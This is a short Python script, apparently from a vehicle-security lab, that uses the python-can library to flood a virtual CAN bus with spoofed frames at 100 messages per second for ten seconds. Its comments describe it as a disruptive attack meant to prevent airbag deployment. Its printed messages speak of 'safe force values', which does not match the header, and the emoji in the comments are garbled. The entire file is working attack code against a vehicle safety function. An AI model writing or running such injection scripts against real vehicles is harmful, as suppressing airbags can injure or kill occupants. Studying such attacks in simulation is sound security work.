# spam_airbag_deployed.py
# ğŸš« Disruptive script: spams airbag deployed to prevent airbag deployment
# â±ï¸ Runs for 10 seconds then exits cleanly to avoid socket lingering

import can
import time

try:
    bus = can.interface.Bus("vcan0", interface="socketcan")  # âœ… Updated from deprecated 'bustype'
    msg = can.Message(arbitration_id=0x501, data=[0x01], is_extended_id=False)

    print("ğŸš« Spamming safe force values for 10 seconds...")
    start_time = time.time()

    while time.time() - start_time < 10:
        bus.send(msg)
        time.sleep(0.01)  # 100 messages per second

    print("â›” Spam finished after 10 seconds.")

except KeyboardInterrupt:
    print("â›” Spam interrupted manually.")

finally:
    if 'bus' in locals():
        bus.shutdown()
